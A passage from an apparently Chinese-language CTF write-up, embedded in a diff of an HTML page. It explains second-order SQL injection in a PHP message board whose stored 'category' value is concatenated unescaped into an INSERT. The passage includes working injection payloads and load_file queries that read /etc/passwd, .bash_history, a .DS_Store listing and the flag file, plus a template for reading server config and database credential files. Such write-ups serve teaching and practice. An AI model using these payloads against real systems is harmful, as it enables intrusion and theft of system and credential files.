+                content = '</span><span class="nv">$content</span><span class="s2">'"</span><span class="p">;</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: ./index.php"</span><span class="p">);</span>
+    <span class="k">break</span><span class="p">;</span>
+<span class="k">case</span> <span class="s1">'comment'</span><span class="o">:</span>
+    <span class="nv">$bo_id</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'bo_id'</span><span class="p">]);</span>
+    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"select category from board where id='</span><span class="nv">$bo_id</span><span class="s2">'"</span><span class="p">;</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+    <span class="nv">$num</span> <span class="o">=</span> <span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
+    <span class="nv">$category</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">)[</span><span class="s1">'category'</span><span class="p">];</span>
+    <span class="nv">$content</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]);</span>
+    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"insert into comment
+            set category = '</span><span class="nv">$category</span><span class="s2">',
+                content = '</span><span class="nv">$content</span><span class="s2">',
+                bo_id = '</span><span class="nv">$bo_id</span><span class="s2">'"</span><span class="p">;</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: ./comment.php?id=</span><span class="nv">$bo_id</span><span class="s2">"</span><span class="p">);</span>
+    <span class="k">break</span><span class="p">;</span>
+<span class="k">default</span><span class="o">:</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: ./index.php"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span><span class="p">{</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: ./index.php"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>后台对输入的参数通过addslashes()对预定义字符进行转义，加上\，预定义的字符包括单引号，双引号，反斜杠，NULL。但是放到数据库后会把转义符 \ 去掉（进入数据库后是没有反斜杠的），并存入数据库中。</p>
+
+<p>发帖的时候所有参数进行了转义才放到sql语句中，但是在cmment中，对于category的值从数据库取出来没有进行转义，直接拼接到sql insert语句中，这就存在二次注入的可能。</p>
+
+<ul>
+  <li>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被再次读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序再次调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。二次注入和普通的sql注入区别就是，二次注入是把恶意代码放入数据库中，执行后通过select等语句把结果回显，一般存在于insert语句中</li>
+</ul>
+
+<p><strong>本题思路就是通过发帖，在category中放入payload，存入数据库中，不过这一过程payload因为对单引号等作了转义，不会被触发，只有在发帖成功后，在留言comment，调用insert语句时因为没有对数据库取出的category进行转义，直接拼接才会触发payload。</strong></p>
+
+<ol>
+  <li>发帖</li>
+</ol>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/10.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">payload:0',content=database(),/*</code></p>
+
+<ol>
+  <li>在提交留言处输入<code class="language-plaintext highlighter-rouge">*/#</code>
+（这个sql语句是换行的，所以我们无法用单行注释符，必须用/**/拼接）</li>
+</ol>
+
+<p>这样 sql语句 拼接 并 闭合 情况如下：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">insert</span> <span class="n">into</span> <span class="n">comment</span>
+            <span class="n">set</span> <span class="n">category</span> <span class="o">=</span> <span class="s1">'0'</span><span class="p">,</span><span class="n">content</span><span class="o">=</span><span class="nf">database</span><span class="p">(),</span><span class="cm">/*,
+                content = '*/</span><span class="c1">#',</span>
+                <span class="n">bo_id</span> <span class="o">=</span> <span class="s1">'$bo_id'</span>
+</code></pre></div></div>
+
+<p>利用content的回显即可看到结果：数据库名为ctf</p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/11.png" alt="" /></p>
+
+<p>之后查表等发现都不行，看了师傅们的WriteUp，发现这里是用sql来读取文件。模板：select load_file(‘文件绝对路径’)。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>load_file(‘文件绝对路径’)读取文件并返回文件内容为字符串。使用此函数，该文件必须位于服务器主机上，必须指定完整路径的文件，必须有FILE权限。
+一般用法步骤：
+
+读/etc/init.d下的东西，这里有配置文件路径
+?id=1' union select 1,2,load_file('/etc/init.d/httpd')
+得到web安装路径
+?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')
+读取密码文件
+?id=1' union select 1,2,load_file('var/www/html/xxx.com/php/conn.inc.php')
+</code></pre></div></div>
+
+<p>首先读取/etc/passwd，这个文件存放了系统用户和用户的路径</p>
+
+<p><code class="language-plaintext highlighter-rouge">a',content=(select (load_file('/etc/passwd'))),/*</code></p>
+
+<p>load_file()不用括在括号里也可</p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/12.png" alt="" /></p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/13.png" alt="" /></p>
+
+<p>读取成功，可以知道www用户（一般和网站操作相关的用户，由中间件创建）的目录是/home/www，可以查询这下面的.bash_history</p>
+
+<p><em>每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件，保存了当前用户使用过的历史命令，方便查找。</em></p>
+
+<p>payload:</p>
+
+<p><code class="language-plaintext highlighter-rouge">a',content=(select (load_file('/home/www/.bash_history'))),/*</code></p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/14.png" alt="" /></p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/15.png" alt="" /></p>
+
+<p>得到历史记录里之前所执行的命令
+可以看到html.zip里面有一个.DS_Store文件，复制到/var/www/html目录下后被删除了，但是在/tmp/下只是删除了压缩包，但是因为有解压的过程，所以解压后生成的文件夹html里还存在.DS_Store文件，读取这个文件。</p>
+
+<p><em>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。通过.DS_Store可以知道这个目录里面所有文件的清单。</em></p>
+
+<p>payload:</p>
+
+<p><code class="language-plaintext highlighter-rouge">a', content=(select (load_file('/tmp/html/.DS_Store'))),/*</code></p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/16.png" alt="" /></p>
+
+<p>这儿由于文件太大，不能完全显示，所以我们用十六进制编码，然后找个网站解码就行了。改为payload：</p>
+
+<p><code class="language-plaintext highlighter-rouge">a', content=(select hex(load_file('/tmp/html/.DS_Store'))),/*</code></p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/17.png" alt="" /></p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/18.png" alt="" /></p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/19.png" alt="" /></p>
+
+<p>读取这个flag_8946e1ff1ee3e40f.php文件</p>
+
+<p>payload：</p>
+
+<p><code class="language-plaintext highlighter-rouge">a',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*</code></p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/20.png" alt="" /></p>
+
+<p>十六进制解码后得到flag</p>
+
+<p><img src="../../../img/2021/oh-my-ctf-2021/21.png" alt="" /></p>
+
+<h1 id="社长的礼物web">社长的礼物(WEB)</h1>
 
             </div>
             <div class="spacing"></div>
